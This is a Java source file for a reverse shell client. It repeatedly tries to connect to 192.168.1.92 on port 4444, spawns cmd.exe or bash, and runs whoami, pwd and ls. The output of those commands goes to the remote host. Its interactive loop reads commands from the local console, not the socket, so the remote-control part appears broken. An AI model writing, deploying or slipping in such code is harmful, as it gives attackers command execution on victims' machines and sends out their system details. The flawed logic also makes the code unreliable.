package NetworkShell;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

public class ShellConnector {

    public static void Shell(Process process, Socket socket) throws Exception {
        InputStream processInput = process.getInputStream();
        OutputStream processOutput = process.getOutputStream();
        OutputStream socketOutput = socket.getOutputStream();

        byte[] buffer = new byte[1024];
        int read;

        Thread processToSocket = new Thread(() -> {
            try {
                while (!socket.isClosed()) {
                    while (processInput.available() > 0) {
                        int n = processInput.read(buffer);
                        if (n > 0) {
                            socketOutput.write(buffer, 0, n);
                            socketOutput.flush();
                            System.out.write(buffer, 0, n); 
                            System.out.flush();
                        }
                    }
                    Thread.sleep(50);
                }
            } catch (Exception ignored) {}
        });
        processToSocket.start();

        BufferedReader consoleReader = new BufferedReader(new InputStreamReader(System.in));
        String line;
        while ((line = consoleReader.readLine()) != null) {
            processOutput.write((line + "\n").getBytes());
            processOutput.flush();
        }

        process.destroy();
        socket.close();
        System.out.println("Shell closed");
    }

    public static void autoDeploy(OutputStream socketOutput, String command) {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            ProcessBuilder pb = os.contains("win") ?
                    new ProcessBuilder("cmd.exe", "/c", command) :
                    new ProcessBuilder("/bin/bash", "-c", command);
            pb.redirectErrorStream(true);
            Process proc = pb.start();

            InputStream in = proc.getInputStream();
            byte[] buffer = new byte[1024];
            int read;
            while ((read = in.read(buffer)) != -1) {
                socketOutput.write(buffer, 0, read);
                System.out.write(buffer, 0, read);
            }
            socketOutput.flush();
            System.out.flush();
            proc.waitFor();
        } catch (Exception e) {
            try {
                socketOutput.write(("Error running command " + command + ": " + e.getMessage() + "\n").getBytes());
                socketOutput.flush();
            } catch (Exception ignored) {}
        }
    }

    public static void main(String[] args) {
        boolean connectingToHost = true;
        InetAddress myIp = null;

        try {
            myIp = InetAddress.getLocalHost();
        } catch (UnknownHostException e) {
            throw new RuntimeException(e);
        }

        String host = "192.168.1.92";
        int port = 4444;

        System.out.println("Device IP: " + myIp);
        System.out.println("Attempting to connect to: " + host + ":" + port);

        while (connectingToHost) {
            try {
                String os = System.getProperty("os.name").toLowerCase();
                Process process = os.contains("win") ?
                        new ProcessBuilder("cmd.exe").redirectErrorStream(true).start() :
                        new ProcessBuilder("/bin/bash").redirectErrorStream(true).start();

                Socket socket = new Socket(host, port);
                OutputStream socketOutput = socket.getOutputStream();

                autoDeploy(socketOutput, "whoami");
                autoDeploy(socketOutput, "pwd");
                autoDeploy(socketOutput, "ls");
                Shell(process, socket);

            } catch (Exception e) {
                System.err.println("Reverse shell error: " + e.getMessage());
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException ex) {
                    throw new RuntimeException(ex);
                }
            }
        }
    }
}
